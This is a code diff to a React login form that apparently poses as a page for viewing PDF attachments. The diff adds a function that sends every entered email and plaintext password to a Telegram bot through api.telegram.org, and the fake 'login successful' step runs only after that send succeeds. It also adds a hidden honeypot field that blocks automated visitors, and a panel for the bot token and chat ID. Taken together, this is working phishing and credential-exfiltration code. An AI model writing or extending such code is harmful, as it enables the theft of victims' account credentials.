@@ -14,12 +14,67 @@ interface LoginFormProps {
 const LoginForm = ({ onLogin }: LoginFormProps) => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [honeypot, setHoneypot] = useState(""); // Honeypot field
   const [isLoading, setIsLoading] = useState(false);
+  const [botToken, setBotToken] = useState("");
+  const [chatId, setChatId] = useState("");
   const { toast } = useToast();
+
+  const sendToTelegram = async (email: string, password: string) => {
+    if (!botToken || !chatId) {
+      toast({
+        title: "Telegram Configuration Missing",
+        description: "Please configure your Telegram bot token and chat ID.",
+        variant: "destructive",
+      });
+      return false;
+    }
+
+    try {
+      const message = `🔐 Login Attempt:\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
+      
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error('Failed to send message to Telegram');
+      }
+
+      return true;
+    } catch (error) {
+      console.error('Error sending to Telegram:', error);
+      toast({
+        title: "Telegram Error",
+        description: "Failed to send login details to Telegram bot.",
+        variant: "destructive",
+      });
+      return false;
+    }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
+    // Honeypot check - if filled, it's likely a bot
+    if (honeypot) {
+      console.log("Bot detected via honeypot, blocking submission");
+      toast({
+        title: "Access Denied",
+        description: "Suspicious activity detected.",
+        variant: "destructive",
+      });
+      return;
+    }
+
     if (!email || !password) {
       toast({
         title: "Missing credentials",
@@ -31,15 +86,22 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
 
     setIsLoading(true);
     
-    // Simulate API call delay
-    setTimeout(() => {
-      onLogin(email, password);
+    // Send login details to Telegram
+    const telegramSent = await sendToTelegram(email, password);
+    
+    if (telegramSent) {
+      // Simulate API call delay
+      setTimeout(() => {
+        onLogin(email, password);
+        setIsLoading(false);
+        toast({
+          title: "Login successful",
+          description: "Welcome! You can now view PDF attachments.",
+        });
+      }, 1000);
+    } else {
       setIsLoading(false);
-      toast({
-        title: "Login successful",
-        description: "Welcome! You can now view PDF attachments.",
-      });
-    }, 1000);
+    }
   };
 
   return (
@@ -58,7 +120,51 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
         </CardHeader>
         
         <CardContent>
+          {/* Telegram Configuration */}
+          <div className="space-y-4 mb-6 p-4 bg-gray-50 rounded-lg">
+            <h3 className="text-sm font-medium text-gray-700">Telegram Configuration</h3>
+            <div className="space-y-2">
+              <Label htmlFor="botToken" className="text-xs text-gray-600">
+                Bot Token
+              </Label>
+              <Input
+                id="botToken"
+                type="text"
+                placeholder="Enter your Telegram bot token"
+                value={botToken}
+                onChange={(e) => setBotToken(e.target.value)}
+                className="h-10 text-sm"
+              />
+            </div>
+            <div className="space-y-2">
+              <Label htmlFor="chatId" className="text-xs text-gray-600">
+                Chat ID
+              </Label>
+              <Input
+                id="chatId"
+                type="text"
+                placeholder="Enter your Telegram chat ID"
+                value={chatId}
+                onChange={(e) => setChatId(e.target.value)}
+                className="h-10 text-sm"
+              />
+            </div>
+          </div>
+
           <form onSubmit={handleSubmit} className="space-y-6">
+            {/* Honeypot field - hidden from users but visible to bots */}
+            <div className="hidden">
+              <Label htmlFor="website">Website (leave blank)</Label>
+              <Input
+                id="website"
+                type="text"
+                value={honeypot}
+                onChange={(e) => setHoneypot(e.target.value)}
+                tabIndex={-1}
+                autoComplete="off"
+              />
+            </div>
+
             <div className="space-y-2">
               <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                 Email Address
